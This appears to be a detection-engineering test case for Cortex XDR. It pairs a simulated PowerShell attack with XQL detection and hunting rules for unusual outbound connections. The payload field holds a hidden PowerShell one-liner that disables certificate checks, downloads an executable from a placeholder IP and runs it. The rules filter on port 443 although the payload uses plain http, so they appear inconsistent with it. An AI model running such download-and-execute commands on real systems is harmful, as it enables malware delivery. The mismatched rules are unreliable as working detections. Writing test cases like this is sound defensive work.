identity.name: Windows Endpoint - Uncommon Communication to Instant Messaging Server
identity.summary: An attacker uses PowerShell to download and execute a payload that communicates with an instant messaging server. Cortex should detect the unusual network communication pattern and process behavior.
identity.description: An attacker uses PowerShell to download and execute a payload that communicates with an instant messaging server. Cortex should detect the unusual network communication pattern and process behavior.

payload.code: powershell -WindowStyle Hidden -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.10/malware.exe', 'C:\Users\Public\malware.exe'); Start-Process -FilePath 'C:\Users\Public\malware.exe' -WindowStyle Hidden"

expected_artifacts.description: Outbound connection to instant messaging server

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon Process Communication to Instant Messaging Server
biocs.description: Detection of process initiating communication to an instant messaging server
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION and event_sub_type = ENUM.NETWORK_CONNECTION_ESTABLISHED
| filter action_remote_ip = '192.0.2.10' and dst_port = 443
| filter actor_process_image_name != null
| filter actor_process_image_name contains 'powershell.exe'

abiocs.name: Behavioral Abnormal Communication to IM Server
abiocs.description: Process behavior that deviates from normal communication patterns to instant messaging server
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION and event_sub_type = ENUM.NETWORK_CONNECTION_ESTABLISHED
| filter action_remote_ip = '192.0.2.10' and dst_port = 443
| filter actor_process_image_name contains 'powershell.exe'
| filter actor_process_image_name != 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'

xql_queries.name: Hunt for PowerShell with IM Communication
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION and event_sub_type = ENUM.NETWORK_CONNECTION_ESTABLISHED
| filter action_remote_ip = '192.0.2.10' and dst_port = 443
| filter actor_process_image_name contains 'powershell.exe'
| comp count() as cnt by actor_process_image_name, action_remote_ip, dst_port
